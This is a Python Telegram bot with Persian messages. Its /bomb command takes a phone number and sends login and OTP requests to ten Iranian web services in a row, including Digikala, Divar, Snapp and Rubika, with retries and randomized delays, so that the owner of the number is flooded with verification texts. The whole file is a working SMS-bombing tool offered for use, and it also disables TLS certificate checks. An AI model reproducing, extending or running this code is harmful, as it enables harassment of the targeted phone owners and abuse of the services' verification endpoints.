import os
import telebot
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib3
from flask import Flask
import time
import random

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BOT_TOKEN = os.environ.get("BOT_TOKEN")
bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)

# API های اصلی که روی Railway جواب میدن
CORE_SERVICES = {
    'digikala': lambda num: requests.post(
        url="https://api.digikala.com/v1/user/authenticate/",
        json={"username": f"0{num}"},
        headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
        timeout=10,
        verify=False
    ),
    
    'divar': lambda num: requests.post(
        url="https://api.divar.ir/v5/auth/authenticate",
        json={"phone": num},
        headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
        timeout=10,
        verify=False
    ),

    'snapp': lambda num: requests.post(
        url="https://app.snapp.taxi/api/api-passenger-oauth/v2/otp",
        json={"cellphone": f"+98{num}"},
        headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
        timeout=10,
        verify=False
    ),

    'snappfood': lambda num: requests.post(
        url="https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass",
        json={"cellphone": f"0{num}"},
        headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
        timeout=10,
        verify=False
    ),

    'tapsi': lambda num: requests.post(
        url="https://tap33.me/api/v2/user",
        json={"credential": {"phoneNumber": f"0{num}", "role": "PASSENGER"}},
        headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
        timeout=10,
        verify=False
    ),

    'rubika': lambda num: requests.post(
        url="https://messengerg2c4.iranlms.ir/",
        json={
            "api_version": "3",
            "method": "sendCode",
            "data": {
                "phone_number": num,
                "send_type": "SMS"
            }
        },
        headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
        timeout=10,
        verify=False
    ),

    'bit24': lambda num: requests.post(
        url="https://bit24.cash/auth/bit24/api/v3/auth/check-mobile",
        json={"mobile": f"0{num}", "country_code": "98"},
        headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
        timeout=10,
        verify=False
    ),

    'alibaba': lambda num: requests.post(
        url="https://ws.alibaba.ir/api/v3/account/mobile/otp",
        json={"phoneNumber": f"0{num}"},
        headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
        timeout=10,
        verify=False
    ),

    'banimod': lambda num: requests.post(
        url="https://mobapi.banimode.com/api/v2/auth/request",
        json={"phone": f"0{num}"},
        headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
        timeout=10,
        verify=False
    ),

    'sheypoor': lambda num: requests.post(
        url="https://www.sheypoor.com/auth",
        json={"username": num},
        headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
        timeout=10,
        verify=False
    )
}

user_sessions = {}

@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(message.chat.id, "به ربات دکتر ارور خوش اومدید")

@bot.message_handler(commands=['bomb'])
def bomb(message):
    user_sessions[message.chat.id] = "waiting_phone"
    bot.send_message(message.chat.id, "شماره:")

def send_with_retry(service_func, phone, max_retries=2):
    """ارسال با قابلیت تکرار در صورت خطا"""
    for attempt in range(max_retries):
        try:
            response = service_func(phone)
            if response.status_code in [200, 201, 202, 204]:
                return True
            time.sleep(1)  # تاخیر بین تلاش‌ها
        except:
            time.sleep(1)
    return False

@bot.message_handler(func=lambda message: True)
def handle_message(message):
    chat_id = message.chat.id
    
    if chat_id in user_sessions and user_sessions[chat_id] == "waiting_phone":
        phone = message.text.strip()
        user_sessions[chat_id] = "processing"
        
        progress_msg = bot.send_message(chat_id, "در حال ارسال...")
        
        success = 0
        failed = 0
        total = len(CORE_SERVICES)
        
        # ارسال به صورت سری‌ای با تاخیر
        for name, service in CORE_SERVICES.items():
            try:
                if send_with_retry(service, phone):
                    success += 1
                    bot.edit_message_text(
                        f"در حال ارسال...\n{success}/{total}",
                        chat_id=chat_id,
                        message_id=progress_msg.message_id
                    )
                else:
                    failed += 1
                
                # تاخیر تصادفی بین ارسال‌ها
                time.sleep(random.uniform(1, 3))
                
            except Exception as e:
                failed += 1
                continue
        
        bot.edit_message_text(
            f"ارسال کامل شد\n✅ موفق: {success}\n❌ ناموفق: {failed}",
            chat_id=chat_id,
            message_id=progress_msg.message_id
        )
        
        del user_sessions[chat_id]

@app.route('/')
def home():
    return "Bot is running"

@app.route('/health')
def health():
    return "OK"

def run_flask():
    app.run(host='0.0.0.0', port=os.environ.get('PORT', 5000))

if __name__ == "__main__":
    import threading
    flask_thread = threading.Thread(target=run_flask)
    flask_thread.daemon = True
    flask_thread.start()
    
    bot.infinity_polling()
